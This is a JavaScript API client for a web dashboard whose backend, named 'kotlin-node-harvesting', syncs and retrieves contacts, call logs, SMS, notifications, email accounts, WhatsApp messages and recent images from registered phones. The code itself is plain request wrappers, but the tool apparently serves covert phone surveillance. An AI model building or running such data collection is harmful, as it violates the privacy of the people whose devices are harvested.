import axios from 'axios';

const API_BASE_URL = process.env.NEXT_PUBLIC_API_URL || 'https://kotlin-node-harvesting.onrender.com';

const api = axios.create({
  baseURL: `${API_BASE_URL}/api`,
  timeout: 30000,
  headers: {
    'Content-Type': 'application/json',
  },
});

// Request interceptor
api.interceptors.request.use(
  (config) => {
    console.log(`Making ${config.method?.toUpperCase()} request to ${config.url}`);
    return config;
  },
  (error) => {
    return Promise.reject(error);
  }
);

// Response interceptor
api.interceptors.response.use(
  (response) => {
    return response;
  },
  (error) => {
    console.error('API Error:', error.response?.data || error.message);
    return Promise.reject(error);
  }
);

// Health Check API
export const healthAPI = {
  check: () => api.get('/client/health'),
  getStats: () => api.get('/client/health')
};

// Device API - Updated to use client routes
export const deviceAPI = {
  getAll: () => api.get('/client/dashboard/devices'),
  register: (deviceData) => api.post('/devices/register', deviceData),
  getSettings: (deviceId) => api.get(`/devices/${deviceId}/settings`),
  updateSettings: (deviceId, settings) => api.put(`/devices/${deviceId}/settings`, { settings }),
  updateStatus: (deviceId, isActive) => api.patch(`/client/dashboard/devices/${deviceId}/status`, { isActive }),
  updateSync: (deviceId, dataType) => api.post(`/client/dashboard/devices/${deviceId}/sync/${dataType}`),
  // New endpoints from latest backend
  syncData: (deviceId, dataType, data) => api.post(`/devices/${deviceId}/sync`, { dataType, data }),
  getSyncSettings: (deviceId) => api.get(`/client/dashboard/devices/${deviceId}/sync-settings`),
  getLastSync: (deviceId, dataType) => api.get(`/test/devices/${deviceId}/last-sync/${dataType}`),
  getDeviceData: (deviceId, dataType) => api.get(`/client/dashboard/devices/${deviceId}/${dataType}`),
  uploadLast5Images: (deviceId, data) => api.post(`/test/devices/${deviceId}/upload-last-5-images`, data),
  testSync: (deviceId, data) => api.post(`/test/devices/${deviceId}/sync`, data)
};

// Data API - New unified endpoint
export const dataAPI = {
  getAll: (dataType) => api.get(`/data/${dataType}`),
  getByDevice: (deviceId, dataType) => api.get(`/client/dashboard/devices/${deviceId}/${dataType}`),
  sync: (deviceId, dataType, data) => api.post(`/devices/${deviceId}/sync`, { dataType, data })
};

// Contacts API - Updated to use client routes
export const contactsAPI = {
  sync: (deviceId, contacts) => api.post(`/devices/${deviceId}/sync`, { dataType: 'contacts', data: contacts }),
  getAll: (deviceId, params = {}) => api.get(`/client/dashboard/devices/${deviceId}/contacts`, { params }),
  getById: (deviceId, contactId) => api.get(`/test/devices/${deviceId}/contacts/${contactId}`),
  delete: (deviceId, contactId) => api.delete(`/test/devices/${deviceId}/contacts/${contactId}`)
};

// Call Logs API - Updated to use client routes
export const callLogsAPI = {
  sync: (deviceId, callLogs) => api.post(`/devices/${deviceId}/sync`, { dataType: 'callLogs', data: callLogs }),
  getAll: (deviceId, params = {}) => api.get(`/client/dashboard/devices/${deviceId}/calllogs`, { params }),
  getStats: (deviceId) => api.get(`/test/devices/${deviceId}/callLogs/stats`),
  delete: (deviceId, callId) => api.delete(`/test/devices/${deviceId}/callLogs/${callId}`)
};

// Notifications API - Updated to use client routes
export const notificationsAPI = {
  sync: (deviceId, notifications) => api.post(`/devices/${deviceId}/sync`, { dataType: 'notifications', data: notifications }),
  getAll: (deviceId, params = {}) => api.get(`/client/dashboard/devices/${deviceId}/notifications`, { params }),
  getStats: (deviceId) => api.get(`/test/devices/${deviceId}/notifications/stats`),
  delete: (deviceId, notificationId) => api.delete(`/test/devices/${deviceId}/notifications/${notificationId}`)
};

// Messages API - Updated to use client routes
export const messagesAPI = {
  sync: (deviceId, messages) => api.post(`/devices/${deviceId}/sync`, { dataType: 'messages', data: messages }),
  getAll: (deviceId, params = {}) => api.get(`/client/dashboard/devices/${deviceId}/messages`, { params }),
  getStats: (deviceId) => api.get(`/test/devices/${deviceId}/messages/stats`),
  delete: (deviceId, messageId, type) => api.delete(`/test/devices/${deviceId}/messages/${messageId}/${type}`)
};

// Email Accounts API - Updated to use client routes
export const emailAccountsAPI = {
  sync: (deviceId, emailAccounts) => api.post(`/devices/${deviceId}/sync`, { dataType: 'emailAccounts', data: emailAccounts }),
  getAll: (deviceId) => api.get(`/client/dashboard/devices/${deviceId}/emailaccounts`),
  getByAddress: (deviceId, emailAddress) => api.get(`/test/devices/${deviceId}/emailAccounts/${encodeURIComponent(emailAddress)}`),
  updateStatus: (deviceId, emailAddress, isActive) => api.patch(`/test/devices/${deviceId}/emailAccounts/${encodeURIComponent(emailAddress)}/status`, { isActive }),
  delete: (deviceId, emailAddress) => api.delete(`/test/devices/${deviceId}/emailAccounts/${encodeURIComponent(emailAddress)}`)
};

// WhatsApp API - Updated to use client routes
export const whatsappAPI = {
  sync: (deviceId, messages) => api.post(`/devices/${deviceId}/sync`, { dataType: 'whatsapp', data: messages }),
  getAll: (deviceId, params = {}) => api.get(`/test/devices/${deviceId}/whatsapp`, { params }),
  getStats: (deviceId) => api.get(`/test/devices/${deviceId}/whatsapp/stats`),
  delete: (deviceId, messageId) => api.delete(`/test/devices/${deviceId}/whatsapp/${messageId}`)
};

// Admin API - Updated to use client routes
export const adminAPI = {
  fixIndexes: () => api.post('/client/dashboard/admin/fix-indexes'),
  getGlobalStats: () => api.get('/client/dashboard/stats'),
  getDataByType: (dataType) => api.get(`/data/${dataType}`)
};

// Sync API - Updated to use client routes
export const syncAPI = {
  syncData: (deviceId, dataType, data) => api.post(`/devices/${deviceId}/sync`, { dataType, data }),
  getSyncedData: (deviceId, dataType) => api.get(`/client/dashboard/devices/${deviceId}/${dataType}`),
  getSyncStats: (deviceId) => api.get(`/client/dashboard/devices/${deviceId}/sync-settings`),
  getLastSync: (deviceId, dataType) => api.get(`/test/devices/${deviceId}/last-sync/${dataType}`)
};

export default api;
